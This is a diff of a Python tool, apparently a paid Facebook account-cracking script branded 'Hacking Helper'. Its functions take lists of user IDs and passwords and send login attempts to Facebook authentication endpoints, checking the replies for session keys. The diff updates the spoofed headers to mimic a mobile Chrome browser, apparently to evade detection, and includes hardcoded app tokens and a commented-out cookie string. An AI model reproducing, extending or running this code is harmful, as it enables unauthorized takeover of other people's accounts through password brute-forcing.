@@ -140,7 +140,7 @@ logo=(f"""
 \033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : Afglion5 
 \033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : Hacking Helper
 \033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33mFile ×\033[1;35mRandom 
-\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35m10.0
+\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : \033[1;35m10.1
 \033[1;32m[\033[1;31m✓\033[1;32m] YOUTUBE    : \033[1;33m@Afglion5
 \033[1;32m[\033[1;31m✓\033[1;32m] STATUS     :\033[1;35m PAID
 \033[1;32m[\033[1;31m✓\033[1;32m] WHAT'S UPP.:\033[1;35m +93783361438 
@@ -857,24 +857,30 @@ def api3(ids,names,passlist):
 'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
 
-                        headers = {'User-Agent': ua,
-'Accept-Encoding': 'gzip, deflate',
-'Connection': 'close',
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
-'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
-'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-'X-FB-Connection-Type': 'WIFI',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',	
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
+                        headers = {
+    'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=4aLRZuVyPtLywDF3JDXPjc8o; sb=4aLRZtoYBOxT2s0FcJl7pwjn; m_pixel_ratio=2.8860480785369873; locale=en_US; wl_cbv=v2%3Bclient_version%3A2605%3Btimestamp%3A1725014829; vpd=v1%3B708x375x2.8860480785369873; wd=375x708; fr=0PfK8Q9mutH1vN7xP.AWW9VU_lLO5Zklmfd1tEDZPGdfw.Bm0aLh..AAA.0.0.Bm0aNK.AWVjCD07W3Q',
+    'dpr': '2.625',
+    'referer': 'https://m.facebook.com/bookmarks/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"SM-N770F"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'service-worker-navigation-preload': '{"k":"rev,1016105567;locale,en_US;cohort,BP:DEFAULT;branch,trunk;dpr,1;features,;u,100000274834300;","a":"1725014845","t":31536000,"n":"ZgH3NmUK","v":"2605","p":4,"r":1016105567,"o":"h2","y":"wblt"}',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
+}
                         url = 'https://graph.facebook.com/method/auth.login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
@@ -971,26 +977,27 @@ def rndm1(uid,passlist):
 'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
                         content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
                         headers = {
-       'authority': 'mbasic.facebook.com',
-    'method': 'GET',
-    'path': '/login/device-based/login/async/",
-    'scheme': 'https'
+    'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
+    'dpr': '2.625',
     'referer': 'https://m.facebook.com/bookmarks/',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
     'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"SM-N770F"',
     'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
-    'service-worker-navigation-preload': '{"k":"rev,1016105567;locale,en_US;cohort,BP:DEFAULT;branch,trunk;dpr,1;features,;u,100000274834300;","a":"1725014845","t":31536000,"n":"ZgH3NmUK","v":"2605","p":4,"r":1016105567,"o":"h2","y":"wblt"}',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro}
+    'user-agent': pro,
+    'viewport-width': '980',
+}
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
@@ -1181,26 +1188,27 @@ def rndm3(uid,passlist):
 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
 
                         headers = {
-     'authority': 'mbasic.facebook.com',
-    'method': 'GET',
-    'path': '/login/device-based/login/async/",
-    'scheme': 'https'
+    'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
+    'dpr': '2.625',
     'referer': 'https://m.facebook.com/bookmarks/',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
     'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"SM-N770F"',
     'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
-    'service-worker-navigation-preload': '{"k":"rev,1016105567;locale,en_US;cohort,BP:DEFAULT;branch,trunk;dpr,1;features,;u,100000274834300;","a":"1725014845","t":31536000,"n":"ZgH3NmUK","v":"2605","p":4,"r":1016105567,"o":"h2","y":"wblt"}',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro}
+    'user-agent': pro,
+    'viewport-width': '980',
+}
 
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
